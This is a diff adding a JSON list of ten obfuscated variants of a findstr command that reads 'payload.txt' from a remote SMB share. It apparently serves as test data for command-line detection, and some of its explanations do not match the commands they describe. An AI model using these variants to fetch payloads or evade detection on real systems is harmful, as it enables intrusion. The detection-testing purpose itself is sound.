@@ -1,0 +1,42 @@
+[
+  {
+    "output": "findstr /v /l . \"\\\\192.168.1.100\\share\\payload.txt\"",
+    "explanation": "Replaced '-' with '/' for flag substitution and added quotes for path normalization."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192\\.168\\.1\\.100\\share\\payload.txt\"",
+    "explanation": "Used escape characters for dots in the IP address to test path normalization."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" > NUL",
+    "explanation": "Added redirection to NUL to suppress output while preserving the original command structure."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" | findstr .",
+    "explanation": "Piped the output to another findstr command to test reordering and insertion techniques."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" && echo Done",
+    "explanation": "Appended a harmless echo command after the original command to test argument omission and reordering."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" ^| more",
+    "explanation": "Used an escape character with a pipe to test safe command-line mutation techniques."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" ^>^> NUL",
+    "explanation": "Used escape characters and redirection to test safe command-line mutation techniques."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" ^< NUL",
+    "explanation": "Used redirection from NUL to test safe command-line mutation techniques."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" ^<^> NUL",
+    "explanation": "Used redirection from and to NUL to test safe command-line mutation techniques."
+  },
+  {
+    "output": "findstr -v -l . \"\\\\192.168.1.100\\share\\payload.txt\" ^| findstr /m .",
+    "explanation": "Used a pipe and another findstr command to test safe command-line mutation techniques."
+  }
+]
